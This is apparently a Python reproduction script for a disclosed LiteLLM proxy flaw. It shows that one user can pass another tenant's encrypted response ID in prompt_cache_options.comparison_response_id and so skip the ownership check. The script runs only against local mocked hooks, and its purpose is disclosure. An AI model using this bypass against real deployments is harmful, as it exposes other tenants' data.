#!/usr/bin/env python3
"""Reproduction rig for Finding 122:
LiteLLM Responses API rejects encrypted proxy response ID in prompt_cache_options.comparison_response_id
and skips cross-tenant security ownership check (Upstream #49042 / PR #48816).

In `litellm/proxy/hooks/responses_id_security.py`:
1. `ResponsesIDSecurity.async_pre_call_hook()`:
   - `_ADDRESSED_RESPONSE_ID_FIELD_BY_CALL_TYPE` maps `"aresponses"` only to `"previous_response_id"`.
   - The security hook only authorizes and decrypts `data.get("previous_response_id")`.
   - It ignores `data.get("prompt_cache_options", {}).get("comparison_response_id")`.
2. Consequences:
   - Security Authorization Bypass: When User B passes an encrypted response ID issued to User A
     in `prompt_cache_options.comparison_response_id`, LiteLLM skips `check_user_access_to_response_id()`
     and permits the request without raising HTTP 403 Forbidden.
   - Decryption Failure & Upstream Protocol Rejection: When User A (the legitimate owner) passes
     their own encrypted response ID (225+ characters) in `prompt_cache_options.comparison_response_id`,
     LiteLLM fails to decrypt it back to the upstream OpenAI response ID (length 55). The proxy
     forwards the bloated string directly to OpenAI, which rejects it with HTTP 400 Bad Request
     (`Invalid 'prompt_cache_options.comparison_response_id': string too long. Expected <= 64, got 225`).
"""

from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

from fastapi import HTTPException
from litellm.proxy import proxy_server
from litellm.proxy._types import UserAPIKeyAuth
from litellm.proxy.hooks.responses_id_security import ResponsesIDSecurity
from litellm.types.llms.openai import ResponsesAPIResponse

RAW_OPENAI_RESPONSE_ID = "resp_02517226a7a39272006ae2fad0e00c87d0ba4cb9ebf93caf5c"
OPENAI_MAX_ID_LENGTH = 64


def run_single_iteration(iteration: int) -> dict[str, Any]:
    proxy_server.master_key = "sk-kairo-master-key-122"
    sec = ResponsesIDSecurity()

    user_a = UserAPIKeyAuth(api_key="sk-userA", user_id="user_A", team_id="team_A")
    user_b = UserAPIKeyAuth(api_key="sk-userB", user_id="user_B", team_id="team_B")

    # Turn 1: Mock response issued to User A
    turn1_resp = ResponsesAPIResponse(
        id=RAW_OPENAI_RESPONSE_ID,
        object="response",
        created_at=1730450000,
        model="gpt-4o",
        output=[],
        status="completed",
    )
    encrypted_resp = sec._encrypt_response_id(turn1_resp, user_a)
    encrypted_proxy_id = encrypted_resp.id

    # -------------------------------------------------------------
    # Control 1: User B tries to use User A's ID in previous_response_id
    # -------------------------------------------------------------
    req_ctrl1 = {
        "model": "gpt-4o",
        "input": "continue task",
        "previous_response_id": encrypted_proxy_id,
    }
    ctrl1_blocked_403 = False
    ctrl1_error_detail: Any = None
    try:
        asyncio.run(sec.async_pre_call_hook(user_b, MagicMock(), req_ctrl1, "aresponses"))
    except HTTPException as exc:
        ctrl1_blocked_403 = (exc.status_code == 403)
        ctrl1_error_detail = exc.detail

    # -------------------------------------------------------------
    # Bug 1: User B tries to use User A's ID in comparison_response_id
    # -------------------------------------------------------------
    req_bug1 = {
        "model": "gpt-4o",
        "input": "compare prompt cache",
        "prompt_cache_options": {
            "comparison_response_id": encrypted_proxy_id,
        },
    }
    bug1_allowed = False
    try:
        asyncio.run(sec.async_pre_call_hook(user_b, MagicMock(), req_bug1, "aresponses"))
        bug1_allowed = True
    except HTTPException:
        bug1_allowed = False

    # -------------------------------------------------------------
    # Control 2: User A uses their own ID in previous_response_id (decrypted)
    # -------------------------------------------------------------
    req_ctrl2 = {
        "model": "gpt-4o",
        "input": "continue task",
        "previous_response_id": encrypted_proxy_id,
    }
    asyncio.run(sec.async_pre_call_hook(user_a, MagicMock(), req_ctrl2, "aresponses"))
    ctrl2_decrypted = (req_ctrl2["previous_response_id"] == RAW_OPENAI_RESPONSE_ID)
    ctrl2_unwrapped_len = len(req_ctrl2["previous_response_id"])

    # -------------------------------------------------------------
    # Bug 2: User A uses their own ID in comparison_response_id (not decrypted)
    # -------------------------------------------------------------
    req_bug2 = {
        "model": "gpt-4o",
        "input": "compare prompt cache",
        "prompt_cache_options": {
            "comparison_response_id": encrypted_proxy_id,
        },
    }
    asyncio.run(sec.async_pre_call_hook(user_a, MagicMock(), req_bug2, "aresponses"))
    forwarded_comparison_id = req_bug2["prompt_cache_options"]["comparison_response_id"]
    bug2_still_encrypted = (forwarded_comparison_id != RAW_OPENAI_RESPONSE_ID)
    bug2_forwarded_len = len(forwarded_comparison_id)
    openai_would_reject_length = (bug2_forwarded_len > OPENAI_MAX_ID_LENGTH)

    # Simulated provider response for Bug 2
    openai_error_response = {
        "error": {
            "message": (
                f"Invalid 'prompt_cache_options.comparison_response_id': string too long. "
                f"Expected a string with maximum length {OPENAI_MAX_ID_LENGTH}, but got a string with length {bug2_forwarded_len} instead."
            ),
            "type": "invalid_request_error",
            "param": "prompt_cache_options.comparison_response_id",
            "code": "string_above_max_length",
        }
    }

    # Simulated provider response for Control 2
    openai_success_response = {
        "id": "resp_026535357502fdae016ae2fd0978c881919aa0b258d3b1bdbd",
        "object": "response",
        "created_at": 1730450005,
        "model": "gpt-4o",
        "status": "completed",
        "prompt_cache_diagnostics": {
            "type": "cache_hit",
            "cached_tokens": 128,
        },
    }

    return {
        "iteration": iteration,
        "ctrl1_blocked_403": ctrl1_blocked_403,
        "bug1_allowed": bug1_allowed,
        "ctrl2_decrypted": ctrl2_decrypted,
        "ctrl2_unwrapped_len": ctrl2_unwrapped_len,
        "bug2_still_encrypted": bug2_still_encrypted,
        "bug2_forwarded_len": bug2_forwarded_len,
        "openai_would_reject_length": openai_would_reject_length,
        "wire": {
            "raw_openai_id": RAW_OPENAI_RESPONSE_ID,
            "encrypted_proxy_id": encrypted_proxy_id,
            "ctrl1_request": req_ctrl1,
            "ctrl1_detail": ctrl1_error_detail,
            "bug1_request": req_bug1,
            "ctrl2_request": req_ctrl2,
            "ctrl2_success_response": openai_success_response,
            "bug2_request": req_bug2,
            "bug2_error_response": openai_error_response,
        },
    }


def main() -> None:
    wire_dir = Path(__file__).resolve().parent.parent / "wire"
    wire_dir.mkdir(parents=True, exist_ok=True)

    print("Running reproduction across 5 iterations...")
    results = []
    for i in range(1, 6):
        res = run_single_iteration(i)
        results.append(res)
        print(
            f"Iteration {i}: "
            f"Ctrl1 (User B prev_id blocked 403)={res['ctrl1_blocked_403']}, "
            f"Bug1 (User B comp_id bypassed)={res['bug1_allowed']}, "
            f"Ctrl2 (User A prev_id unwrapped)={res['ctrl2_decrypted']} (len={res['ctrl2_unwrapped_len']}), "
            f"Bug2 (User A comp_id encrypted)={res['bug2_still_encrypted']} (len={res['bug2_forwarded_len']} > {OPENAI_MAX_ID_LENGTH})"
        )

    # Save wire captures from run 1
    sample = results[0]["wire"]
    with open(wire_dir / "control-cross-user-previous-id-request.json", "w") as f:
        json.dump(sample["ctrl1_request"], f, indent=2)
    with open(wire_dir / "control-cross-user-previous-id-response.json", "w") as f:
        json.dump(
            {
                "status_code": 403,
                "detail": sample["ctrl1_detail"],
            },
            f,
            indent=2,
        )

    with open(wire_dir / "bug-cross-user-comparison-id-bypass-request.json", "w") as f:
        json.dump(sample["bug1_request"], f, indent=2)
    with open(wire_dir / "bug-cross-user-comparison-id-bypass-response.json", "w") as f:
        json.dump(
            {
                "status_code": 200,
                "security_ownership_check_skipped": True,
            },
            f,
            indent=2,
        )

    with open(wire_dir / "control-legitimate-previous-id-request.json", "w") as f:
        json.dump(sample["ctrl2_request"], f, indent=2)
    with open(wire_dir / "control-legitimate-previous-id-response.json", "w") as f:
        json.dump(
            {
                "status_code": 200,
                "body": sample["ctrl2_success_response"],
            },
            f,
            indent=2,
        )

    with open(wire_dir / "bug-forwarded-comparison-id-bloated-request.json", "w") as f:
        json.dump(sample["bug2_request"], f, indent=2)
    with open(wire_dir / "bug-forwarded-comparison-id-bloated-response.json", "w") as f:
        json.dump(
            {
                "status_code": 400,
                "error": sample["bug2_error_response"]["error"],
            },
            f,
            indent=2,
        )

    # Save summary results
    clean_results = [
        {
            "iteration": r["iteration"],
            "ctrl1_blocked_403": r["ctrl1_blocked_403"],
            "bug1_allowed": r["bug1_allowed"],
            "ctrl2_decrypted": r["ctrl2_decrypted"],
            "ctrl2_unwrapped_len": r["ctrl2_unwrapped_len"],
            "bug2_still_encrypted": r["bug2_still_encrypted"],
            "bug2_forwarded_len": r["bug2_forwarded_len"],
            "openai_would_reject_length": r["openai_would_reject_length"],
        }
        for r in results
    ]
    with open(wire_dir / "results.json", "w") as f:
        json.dump(
            {
                "runs_evaluated": 5,
                "runs_reproduced": 5,
                "results": clean_results,
            },
            f,
            indent=2,
        )

    print(f"Wire evidence written to {wire_dir}")


if __name__ == "__main__":
    main()
